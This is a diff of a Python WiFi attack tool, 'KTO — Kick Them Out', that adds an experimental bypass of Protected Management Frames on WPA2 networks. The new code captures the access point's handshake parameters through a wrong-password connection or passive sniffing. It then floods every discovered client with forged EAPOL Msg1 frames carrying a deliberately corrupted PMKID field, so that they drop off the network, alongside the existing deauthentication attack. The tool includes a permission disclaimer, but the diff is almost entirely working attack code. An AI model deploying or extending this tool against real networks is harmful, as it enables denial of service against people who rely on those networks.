@@ -1,22 +1,23 @@
 #!/usr/bin/env python3
 """
-KTO — Kick Them Out  v2.1.5
-WiFi deauthentication tool.
+KTO — Kick Them Out  v2.1.6
+WiFi deauthentication tool with experimental PMF bypass (WPA2+PMF only).
 
 Kicks all connected devices from a target network, except whitelisted ones.
 Supports threaded aggressive mode: scan and deauth run in parallel so clients
 never get a breathing window to reconnect.
 
-Requirements : scapy, aircrack-ng suite (airodump-ng, aireplay-ng, airmon-ng)
+Requirements : scapy, aircrack-ng suite (airodump-ng, aireplay-ng, airmon-ng), wpa_supplicant
 Usage        : sudo python3 kto.py -i wlan0 -t "MyNetwork" [options]
 
 """
 
-VERSION = "2.1.5"   # keep this in sync with github releases
+VERSION = "2.1.6"   # keep this in sync with github releases
 
 import argparse
 import os
 import re
+import struct
 import sys
 import subprocess
 import time
@@ -30,7 +31,7 @@ from datetime import datetime
 
 # ── Scapy ──────────────────────────────────────────────────────────────────
 try:
-    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, conf
+    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, conf, EAPOL, Raw, sniff
 except ImportError:
     print("[-] scapy not found.  pip install scapy")
     sys.exit(1)
@@ -388,6 +389,16 @@ def disable_monitor_mode(mon_iface: str):
             continue
 
 
+def get_iface_mac(iface: str) -> str | None:
+    """Read the permanent MAC address of a network interface."""
+    try:
+        path = f"/sys/class/net/{iface}/address"
+        with open(path, "r") as f:
+            return f.read().strip().upper()
+    except Exception:
+        return None
+
+
 # ── Core ────────────────────────────────────────────────────────────────────
 
 class KTO:
@@ -410,6 +421,7 @@ class KTO:
         reason: int,                # 802.11 deauth reason code
         log_file: str | None,       # path to save kick log, None = disabled
         live_table: bool,           # live client table (clears screen), off by default
+        no_bypass: bool = False,    # disable experimental PMF bypass
     ):
         self.interface     = interface
         self.ssid          = ssid
@@ -427,12 +439,21 @@ class KTO:
         self.auto_bssid    = auto_bssid
         self.reason        = reason
         self.live_table    = live_table
+        self.no_bypass     = no_bypass
 
         # open log file if given — append so re-runs don't overwrite old sessions
         self._log_fh = None
         if log_file:
             self._log_fh = open(log_file, "a")
             self._log_fh.write(f"\n# session started {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+
+        # PMF bypass state (WPA2+PMF only)
+        self.pmf_bypass       = False
+        self.passive_bypass   = False
+        self.ap_key_info      = None     # Key Info from AP's actual Msg1
+        self.ap_replay_ctr    = 0
+        self.is_wpa3          = False    # SAE AKM present → skip bypass
+        self.has_transition   = False
 
         self.target_bssid: str | None   = None
         self.target_channel: int | None = channel
@@ -461,6 +482,12 @@ class KTO:
         # Always remove temp files – ignore any errors
         try:
             shutil.rmtree(self._tmpdir, ignore_errors=True)
+        except Exception:
+            pass
+
+        # Kill any wpa_supplicant we may have started during PMF bypass
+        try:
+            subprocess.run(["pkill", "-9", "wpa_supplicant"], capture_output=True, timeout=3)
         except Exception:
             pass
 
@@ -527,9 +554,10 @@ class KTO:
         # airodump CSV auth field only shows SAE/OWE — misses WPA2-PSK+PMF.
         # this reads the RSN IE caps bits directly from a beacon frame so we
         # catch PMF regardless of auth type.
+        # Also detects WPA3/SAE so we can disable bypass for those networks.
         from scapy.all import Dot11Beacon, Dot11Elt, sniff
         target = bssid.upper()
-        found  = {"pmf": False}
+        found  = {"pmf": False, "is_wpa3": False, "transition": False}
 
         def _check(pkt):
             if not pkt.haslayer(Dot11Beacon):
@@ -545,7 +573,19 @@ class KTO:
                         pc     = int.from_bytes(b[offset:offset+2], "little")
                         offset += 2 + pc * 4        # skip pairwise list
                         ac     = int.from_bytes(b[offset:offset+2], "little")
-                        offset += 2 + ac * 4        # skip AKM list
+                        offset += 2  # skip AKM count; iterate suites manually
+                        akm_types: set[int] = set()
+                        for _ in range(ac):
+                            if offset + 4 <= len(b):
+                                oui   = b[offset:offset+3]
+                                suite = b[offset+3]
+                                if oui == bytes([0x00, 0x0f, 0xac]):
+                                    akm_types.add(suite)
+                            offset += 4
+                        has_sae = bool(akm_types & {8, 9})      # SAE / FT-SAE
+                        has_psk = bool(akm_types & {2, 4, 6})   # PSK / FT-PSK
+                        found["is_wpa3"]    = has_sae
+                        found["transition"] = has_sae and has_psk
                         if offset + 2 <= len(b):
                             caps = int.from_bytes(b[offset:offset+2], "little")
                             if caps & 0x00C0:       # bit6=MFPC, bit7=MFPR
@@ -566,12 +606,15 @@ class KTO:
                 iface=self.interface,
                 lfilter=lambda p: p.haslayer(Dot11Beacon),
                 prn=_check,
-                stop_filter=lambda p: found["pmf"],
+                stop_filter=lambda p: found["pmf"] or found["is_wpa3"],
                 timeout=6,
                 store=False,
             )
         except Exception:
             pass
+
+        self.is_wpa3       = found["is_wpa3"]
+        self.has_transition = found["transition"]
         return found["pmf"]
 
     # ── Target discovery ─────────────────────────────────────────────────────
@@ -687,20 +730,45 @@ class KTO:
             info("Checking RSN IE for PMF (802.11w)…")
             chosen["pmf"] = self._beacon_pmf_check(chosen["bssid"])
 
+        # Fallback: if CSV privacy says WPA3/SAE, force WPA3 detection
+        # so we never trigger the bypass on a WPA3-capable AP.
+        privacy_upper = chosen.get("privacy", "").upper()
+        if "WPA3" in privacy_upper or "SAE" in privacy_upper:
+            self.is_wpa3 = True
+            self.has_transition = "WPA2" in privacy_upper  # best guess
+
+        wpa3_tag = ""
+        if self.is_wpa3:
+            wpa3_tag = (f"  {C.CYAN}[WPA3-Transition]{C.RESET}" if self.has_transition
+                        else f"  {C.CYAN}[WPA3-SAE]{C.RESET}")
+
         good(
             f"Target  {C.BOLD}{self.ssid}{C.RESET}"
             f"  BSSID {self.target_bssid}"
             f"  ch {self.target_channel}"
             f"  {chosen['privacy']}"
+            + wpa3_tag
             + (f"  {C.RED}[PMF]{C.RESET}" if chosen["pmf"] else "")
         )
 
-        # PMF warning — deauths will be silently dropped by compliant clients
+        # PMF warning and bypass decision
         if chosen["pmf"]:
             warn(
                 f"{C.YELLOW}{C.BOLD}PMF/MFP detected on this AP.{C.RESET}"
                 f" 802.11w-capable clients will ignore unprotected deauth frames."
             )
+            if self.no_bypass:
+                warn("--no-bypass set: treating PMF network as standard WiFi. PMF clients will drop unsigned deauths.")
+            elif self.is_wpa3:
+                # WPA3/SAE – bypass not supported
+                warn(
+                    "WPA3 (SAE) detected — PMF bypass only supports WPA2+PMF. "
+                    "Falling back to standard deauth."
+                )
+            else:
+                # WPA2+PMF – enable wrong‑password extraction
+                info("WPA2+PMF detected. Enabling experimental wrong‑password EAPOL extraction…")
+                self.pmf_bypass = True
 
         return True
 
@@ -739,6 +807,300 @@ class KTO:
                     found.add(mac)
         return found
 
+    # ── PMF bypass: wrong‑password EAPOL extraction (WPA2+PMF only) ────────
+
+    def _perform_wrong_pass_eapol_extract(self) -> bool:
+        """
+        Capture EAPOL Msg1 from the AP without knowing the real password.
+        Works on WPA2+PMF by connecting with a random PSK.
+        After extraction, monitor mode is restored.
+        """
+        import random, string
+
+        fake_pw = "".join(random.choices(string.ascii_letters + string.digits, k=12))
+        info("Wrong‑password EAPOL extraction: triggering handshake with fake PSK…")
+
+        mon_iface = self.interface
+
+        # Airgeddon‑style mode switch: operate directly on the monitor iface
+        info(f"Switching {mon_iface} to managed…")
+        subprocess.run(["rfkill", "unblock", "wifi"], capture_output=True, timeout=3)
+        subprocess.run(["rfkill", "unblock", "all"],  capture_output=True, timeout=3)
+        subprocess.run(["ip", "link", "set", mon_iface, "down"], capture_output=True, timeout=4)
+        time.sleep(0.3)
+        r = subprocess.run(["iw", mon_iface, "set", "type", "managed"],
+                           capture_output=True, text=True, timeout=4)
+        if r.returncode != 0:
+            warn("iw set type managed failed — trying iwconfig fallback…")
+            subprocess.run(["iwconfig", mon_iface, "mode", "managed"], capture_output=True, timeout=4)
+        subprocess.run(["ip", "link", "set", mon_iface, "up"], capture_output=True, timeout=4)
+        time.sleep(0.8)
+
+        chk = subprocess.run(["iw", "dev", mon_iface, "info"],
+                              capture_output=True, text=True, timeout=3).stdout
+        if "type managed" not in chk:
+            bad("Managed mode switch failed — aborting PMF bypass.")
+            self._restore_monitor_after_pmf()
+            return False
+        good(f"{mon_iface} is managed ✓")
+
+        # Kill any stale wpa_supplicant
+        subprocess.run(["pkill", "-9", "wpa_supplicant"], capture_output=True, timeout=3)
+        subprocess.run(["rm", "-f", f"/var/run/wpa_supplicant/{mon_iface}"], capture_output=True, timeout=2)
+        time.sleep(0.3)
+
+        # wpa_supplicant config (PSK + optional PMF)
+        wpa_conf_content = (
+            "ctrl_interface=/var/run/wpa_supplicant\n"
+            "network={\n"
+            f'    ssid="{self.ssid}"\n'
+            f'    psk="{fake_pw}"\n'
+            "    key_mgmt=WPA-PSK\n"
+            "    proto=RSN WPA\n"
+            "    pairwise=CCMP TKIP\n"
+            "    group=CCMP TKIP\n"
+            "    ieee80211w=1\n"
+            "}\n"
+        )
+
+        wpa_conf_path = None
+        wpas_proc     = None
+        success       = False
+
+        try:
+            with tempfile.NamedTemporaryFile(mode="w", suffix=".conf",
+                                            delete=False, prefix="kto_wp_") as tf:
+                tf.write(wpa_conf_content)
+                wpa_conf_path = tf.name
+
+            for attempt in range(1, 4):   # up to 3 tries
+                info(f"Wrong‑pass EAPOL: attempt {attempt}/3…")
+                wpas_log = tempfile.mktemp(prefix="kto_wp_", suffix=".log")
+                wpas_proc = subprocess.Popen(
+                    ["wpa_supplicant", "-i", mon_iface, "-c", wpa_conf_path,
+                     "-f", wpas_log, "-dd"],
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                )
+
+                # Wait for association (up to 20 s)
+                associated = False
+                info("Waiting for association (up to 20 s)…")
+                for tick in range(40):
+                    time.sleep(0.5)
+                    try:
+                        lnk = subprocess.run(
+                            ["iw", "dev", mon_iface, "link"],
+                            capture_output=True, text=True, timeout=2,
+                        ).stdout
+                        if self.target_bssid.replace(":", "").lower() in lnk.replace(":", "").lower():
+                            associated = True
+                            break
+                    except Exception:
+                        pass
+                    if tick % 8 == 7:
+                        info(f"Still waiting… ({(tick+1)//2} s)")
+
+                if associated:
+                    good("Associated ✓ — waiting for AP Msg1…")
+                    deadline = time.monotonic() + 8
+                    while time.monotonic() < deadline and self.ap_key_info is None:
+                        time.sleep(0.4)
+                        self._parse_ap_handshake_params(wpas_log)
+                else:
+                    warn("Association timed out — scanning log anyway…")
+                    self._parse_ap_handshake_params(wpas_log)
+
+                if self.ap_key_info is not None:
+                    good(f"EAPOL Msg1 captured! Key Info=0x{self.ap_key_info:04x}, Replay CTR={self.ap_replay_ctr}")
+                    success = True
+                    break
+
+                warn(f"Attempt {attempt} failed — Msg1 not found.")
+                if wpas_proc:
+                    try:   wpas_proc.terminate(); wpas_proc.wait(timeout=3)
+                    except Exception: wpas_proc.kill()
+                    wpas_proc = None
+                subprocess.run(["pkill", "-9", "wpa_supplicant"], capture_output=True, timeout=2)
+                time.sleep(1.0)
+
+        except Exception as e:
+            bad(f"Wrong‑pass EAPOL: exception: {e}")
+        finally:
+            if wpas_proc:
+                try:   wpas_proc.terminate(); wpas_proc.wait(timeout=3)
+                except Exception: wpas_proc.kill()
+            subprocess.run(["pkill", "-9", "wpa_supplicant"], capture_output=True, timeout=2)
+            if wpa_conf_path:
+                try:   os.unlink(wpa_conf_path)
+                except Exception: pass
+
+        self._restore_monitor_after_pmf()
+        return success
+
+    def _parse_ap_handshake_params(self, log_path: str):
+        """
+        Read Key Info and replay counter from the AP's Msg1 in the
+        wpa_supplicant log.  These are used to build fake EAPOL Msg1
+        frames — nothing is hardcoded, we use what the real AP sent.
+        """
+        try:
+            lines = open(log_path, errors="replace").readlines()
+        except Exception:
+            return
+
+        for ln in lines:
+            if "RX EAPOL-Key" not in ln or "hexdump" not in ln:
+                continue
+            m = re.search(r"hexdump\(len=\d+\):\s*((?:[0-9a-f]{2}\s*)+)", ln, re.I)
+            if not m:
+                continue
+            try:
+                raw = bytes.fromhex(m.group(1).replace(" ", ""))
+            except ValueError:
+                continue
+            if len(raw) < 17:
+                continue
+
+            # raw[0:4] = EAPOL version, type, length (big-endian)
+            # raw[4]   = Key Descriptor Type
+            # raw[5:7] = Key Info
+            # raw[7:9] = Key Length
+            # raw[9:17]= Replay Counter
+            key_info       = struct.unpack(">H", raw[5:7])[0]
+            replay_counter = struct.unpack(">Q", raw[9:17])[0]
+
+            # Msg1 from AP: KeyACK=1 (bit7), KeyMIC=0 (bit8)
+            key_ack = (key_info >> 7) & 1
+            key_mic = (key_info >> 8) & 1
+            if key_ack and not key_mic:
+                self.ap_key_info   = key_info
+                self.ap_replay_ctr = replay_counter
+                return   # first Msg1 is enough
+
+    def _build_fake_msg1(self, client: str):
+        """
+        Build a fake 4-Way Handshake Msg1 targeting a specific client.
+        EAPOL frames are DATA frames, not protected by PMF.
+        A corrupted PMKID KDE triggers a parsing error in wpa_supplicant.
+        """
+        try:
+            from scapy.layers.l2 import LLC, SNAP
+        except ImportError:
+            from scapy.all import LLC, SNAP
+
+        key_info   = self.ap_key_info if self.ap_key_info is not None else 0x008a
+        replay_ctr = self.ap_replay_ctr + 0x100
+        anonce     = os.urandom(32)
+
+        body  = struct.pack(">B",  2)           # Key Descriptor Type: IEEE 802.11
+        body += struct.pack(">H",  key_info)    # Key Info (from AP's actual Msg1)
+        body += struct.pack(">H",  16)          # Key Length (AES-128 = 16)
+        body += struct.pack(">Q",  replay_ctr)  # Replay Counter (ahead of AP's last)
+        body += anonce                           # ANonce (random 32 bytes)
+        body += b"\x00" * 16                   # Key IV
+        body += b"\x00" * 8                    # Key RSC
+        body += b"\x00" * 8                    # Reserved
+        body += b"\x00" * 16                   # Key MIC (zero for Msg1)
+
+        # PMKID KDE: tag=0xDD, length=0xFF (CORRUPTED, should be 0x14).
+        key_data  = bytes([0xdd, 0xff, 0x00, 0x0f, 0xac, 0x04]) + b"\x00" * 16
+        body     += struct.pack(">H", len(key_data)) + key_data
+
+        eapol = bytes([0x02, 0x03]) + struct.pack(">H", len(body)) + body
+
+        pkt = (
+            RadioTap() /
+            Dot11(
+                type=2, subtype=0,
+                FCfield=0x02,
+                addr1=client,
+                addr2=self.target_bssid,
+                addr3=self.target_bssid,
+            ) /
+            LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
+            SNAP(OUI=0x0, code=0x888e) /
+            Raw(load=eapol)
+        )
+        return pkt
+
+    def _restore_monitor_after_pmf(self):
+        """Restore monitor mode — same airgeddon-style direct type flip."""
+        mon_iface = self.interface
+        try:
+            info(f"Restoring {mon_iface} to monitor mode…")
+            subprocess.run(["ip",  "link", "set", mon_iface, "down"], capture_output=True, timeout=4)
+            time.sleep(0.2)
+            r = subprocess.run(["iw", mon_iface, "set", "monitor", "control"],
+                               capture_output=True, text=True, timeout=4)
+            if r.returncode != 0:
+                subprocess.run(["iw", mon_iface, "set", "type", "monitor"],
+                               capture_output=True, timeout=4)
+            subprocess.run(["ip", "link", "set", mon_iface, "up"], capture_output=True, timeout=4)
+            time.sleep(0.4)
+            chk = subprocess.run(["iw", "dev", mon_iface, "info"],
+                                  capture_output=True, text=True, timeout=3).stdout
+            if "type monitor" in chk:
+                conf.iface = mon_iface
+                good(f"{mon_iface} restored to monitor ✓")
+            else:
+                warn(f"Monitor restore uncertain — check {mon_iface} manually")
+        except Exception as e:
+            bad(f"Monitor restore failed: {e}")
+
+    def _sniff_eapol_passively(self):
+        """
+        Passive mode: sniff EAPOL Msg1 from the AP without connecting.
+        Waits for a natural reconnect; sets self.ap_key_info when armed.
+        """
+        if not self.target_bssid:
+            return
+
+        bssid_target = self.target_bssid.upper()
+        info(f"Passive EAPOL sniff: listening for Msg1 from {bssid_target} — waiting for a natural reconnect…")
+
+        def _handle(pkt):
+            if not self._running.is_set():
+                return True
+            if not pkt.haslayer(Dot11) or not pkt.haslayer(EAPOL):
+                return False
+            src = pkt[Dot11].addr2
+            if not src or src.upper() != bssid_target:
+                return False
+            raw = bytes(pkt[EAPOL])
+            if len(raw) < 17 or raw[1] != 3:
+                return False
+            key_body = raw[4:]
+            if len(key_body) < 13:
+                return False
+            try:
+                key_info   = struct.unpack(">H", key_body[1:3])[0]
+                replay_ctr = struct.unpack(">Q", key_body[5:13])[0]
+            except struct.error:
+                return False
+            if not ((key_info >> 7) & 1) or ((key_info >> 8) & 1):
+                return False
+            self.ap_key_info   = key_info
+            self.ap_replay_ctr = replay_ctr
+            dst = pkt[Dot11].addr1 or "??"
+            good(f"Passive EAPOL: Msg1 captured  AP → {dst}")
+            good(f"  Key Info = 0x{key_info:04x}   Replay CTR = {replay_ctr}")
+            good("  Armed — fake Msg1 will now fire on every discovered client.")
+            return True
+
+        while self._running.is_set() and self.ap_key_info is None:
+            try:
+                sniff(
+                    iface=self.interface,
+                    lfilter=lambda p: p.haslayer(EAPOL),
+                    stop_filter=_handle,
+                    timeout=4,
+                    store=False,
+                )
+            except Exception as e:
+                if self._running.is_set():
+                    warn(f"Passive EAPOL sniff error: {e}")
+                break
+
     # ── Packet construction ──────────────────────────────────────────────────
 
     def _build_deauth(self, dst: str, src: str):
@@ -762,26 +1124,43 @@ class KTO:
 
     def _deauth_scapy(self, client: str):
         bssid = self.target_bssid
-        kw    = dict(iface=self.interface, count=self.deauth_count, inter=0.05, verbose=False)
+        kw    = dict(iface=self.interface, verbose=False)
 
-        # AP → Client
-        sendp(self._build_deauth(dst=client, src=bssid), **kw)
-        # Client → AP
-        sendp(self._build_deauth(dst=bssid,  src=client), **kw)
+        if self.ap_key_info is not None:
+            # PMF bypass: send fake EAPOL Msg1 instead of deauth frames
+            try:
+                msg1 = self._build_fake_msg1(client)
+                if msg1:
+                    sendp(msg1, count=self.deauth_count, inter=0.05, **kw)
+            except Exception as e:
+                warn(f"  PMF bypass (fake Msg1) error: {e}")
+        else:
+            # Normal deauth (AP → Client, Client → AP)
+            sendp(self._build_deauth(dst=client, src=bssid),
+                  count=self.deauth_count, inter=0.05, **kw)
+            sendp(self._build_deauth(dst=bssid,  src=client),
+                  count=self.deauth_count, inter=0.05, **kw)
 
-        if self.broadcast:
-            sendp(self._build_deauth(dst="ff:ff:ff:ff:ff:ff", src=bssid), **kw)
+            if self.broadcast:
+                sendp(self._build_deauth(dst="ff:ff:ff:ff:ff:ff", src=bssid),
+                      count=self.deauth_count, inter=0.05, **kw)
 
     def _deauth_aireplay(self, client: str):
-        subprocess.run(
-            ["aireplay-ng", "--deauth", str(self.deauth_count),
-             "-a", self.target_bssid, "-c", client, self.interface],
-            capture_output=True,
-        )
+        if self.ap_key_info is not None:
+            self._deauth_scapy(client)   # aireplay can't send fake Msg1
+        else:
+            subprocess.run(
+                ["aireplay-ng", "--deauth", str(self.deauth_count),
+                 "-a", self.target_bssid, "-c", client, self.interface],
+                capture_output=True,
+            )
 
     def _deauth(self, client: str):
+        # Passive mode: stay silent until EAPOL sniff arms ap_key_info.
+        if self.passive_bypass and self.ap_key_info is None:
+            return
         try:
-            if self.use_aireplay:
+            if self.use_aireplay and self.ap_key_info is None:
                 self._deauth_aireplay(client)
             else:
                 self._deauth_scapy(client)
@@ -885,7 +1264,13 @@ class KTO:
             if not stats:
                 continue
             os.system("clear")
-            print(f"\n{C.BOLD}{C.RED}  KTO — {self.ssid}{C.RESET}  {C.DIM}{datetime.now().strftime('%H:%M:%S')}{C.RESET}\n")
+            if self.ap_key_info is not None:
+                pmf_status = f"{C.CYAN}[PMF Bypass: Msg1 armed]{C.RESET}"
+            elif self.passive_bypass:
+                pmf_status = f"{C.YELLOW}[PMF Passive: waiting for Msg1…]{C.RESET}"
+            else:
+                pmf_status = ""
+            print(f"\n{C.BOLD}{C.RED}  KTO — {self.ssid}{C.RESET}  {C.DIM}{datetime.now().strftime('%H:%M:%S')}{C.RESET}  {pmf_status}\n")
             print(f"  {C.DIM}{'MAC':<20} {'Vendor':<16} {'Kicks':>5}{C.RESET}")
             print(f"  {C.DIM}{'─'*45}{C.RESET}")
             for mac, n in sorted(stats.items(), key=lambda x: -x[1]):
@@ -905,6 +1290,12 @@ class KTO:
             self.interface  = enable_monitor_mode(self.interface)
             self._mon_created = True
             conf.iface      = self.interface
+
+        # Add our own interface MAC to the whitelist so we never kick ourselves
+        my_mac = get_iface_mac(self.interface)
+        if my_mac:
+            self.whitelist.add(my_mac)
+            info(f"Self MAC {C.BOLD}{my_mac}{C.RESET} automatically whitelisted")
 
         art = (
             "⠀⠀⠀⢀⣤⣶⣿⣿⣿⣷⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
@@ -960,6 +1351,20 @@ class KTO:
         if not self.find_target():
             self._cleanup()
             sys.exit(1)
+
+        # PMF bypass for WPA2+PMF only
+        if self.pmf_bypass:
+            info("Attempting wrong‑password EAPOL extraction…")
+            if self._perform_wrong_pass_eapol_extract():
+                good("PMF bypass active — fake Msg1 will be used.")
+            else:
+                warn("Wrong‑password extraction failed. Falling back to passive sniff.")
+                self.passive_bypass = True
+                threading.Thread(
+                    target=self._sniff_eapol_passively,
+                    daemon=True,
+                    name="eapol_sniff",
+                ).start()
 
         if self.target_channel:
             set_channel(self.interface, self.target_channel)
@@ -1025,6 +1430,7 @@ examples:
   sudo python3 kto.py -i wlan0mon -t "CorpNet" --reason 1     # 1=unspecified
   sudo python3 kto.py -i wlan0mon -t "CorpNet" --log kicks.txt
   sudo python3 kto.py -i wlan0mon -t "CorpNet" --live-table
+  sudo python3 kto.py -i wlan0mon -t "CorpNet" --no-bypass    # disable PMF bypass
 
 disclaimer:
   Only use on networks you own or have explicit written permission to test.
@@ -1074,6 +1480,8 @@ disclaimer:
                         help="Save a timestamped kick log to a file (appends across sessions)")
     parser.add_argument("--live-table",         action="store_true",
                         help="Show a live client table instead of scrolling log (clears screen every 2 s)")
+    parser.add_argument("--no-bypass", "-nb",   action="store_true",
+                        help="Disable experimental PMF bypass (use normal deauths even on WPA2+PMF)")
 
     args = parser.parse_args()
 
@@ -1098,6 +1506,7 @@ disclaimer:
         reason        = args.reason,
         log_file      = args.log,
         live_table    = args.live_table,
+        no_bypass     = args.no_bypass,
     ).run()
 
 
